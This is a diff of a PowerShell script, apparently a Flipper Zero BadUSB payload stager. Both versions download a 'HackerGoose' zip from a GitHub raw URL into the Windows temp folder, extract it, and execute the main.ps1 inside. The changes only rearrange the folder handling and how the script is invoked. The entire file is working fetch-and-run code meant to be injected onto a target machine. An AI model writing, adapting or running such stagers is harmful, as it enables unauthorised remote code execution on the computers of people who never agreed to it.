@@ -1,22 +1,30 @@
-# Set the temporary directory
-$TempDirectory = $env:TEMP
+# Set the URL for the raw content of the zip file on GitHub
+$zipUrl = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/HackerGoose/HackerGoose.zip"
 
-# Specify the URL to the zip file
-$ZipUrl = 'https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/HackerGoose/HackerGoose.zip'
+# Specify the temporary folder for extracting
+$tempFolder = "$env:TEMP\HackerGooseTemp"
 
-# Set TLS version to 1.2
+# Create the temporary folder if it doesn't exist
+New-Item -ItemType Directory -Path $tempFolder -Force
+
+# Specify the destination folder in temp
+$Destination = "$env:TEMP"
+
+# Force the use of TLS 1.2
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Download the zip file
-Invoke-WebRequest -Uri $ZipUrl -OutFile "$TempDirectory\HackerGoose.zip"
+# Download the zip file using Invoke-WebRequest
+$zipPath = Join-Path $tempFolder "HackerGoose.zip"
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
 
-# Extract the contents of the "hg" folder directly into the temporary directory
+# Extract the contents of the "HackerGoose" folder to temp
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory("$TempDirectory\HackerGoose.zip", $TempDirectory)
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $Destination)
 
-# Build the full path to main.ps1
-$mainScriptPath = Join-Path $TempDirectory "hg\main.ps1"
+# Move the "hg" folder contents to temp
+Move-Item -Path (Join-Path $Destination "HackerGoose\hg\*") -Destination $Destination -Force
 
-# Run the main.ps1 script
-Invoke-Expression -Command $mainScriptPath
-Remove-Item -Path (Join-Path $env:TEMP "HackerGoose.zip")
+# Clean up the temporary folder
+Remove-Item -Path $tempFolder -Recurse -Force
+
+& "$env:TEMP\hg\main.ps1"
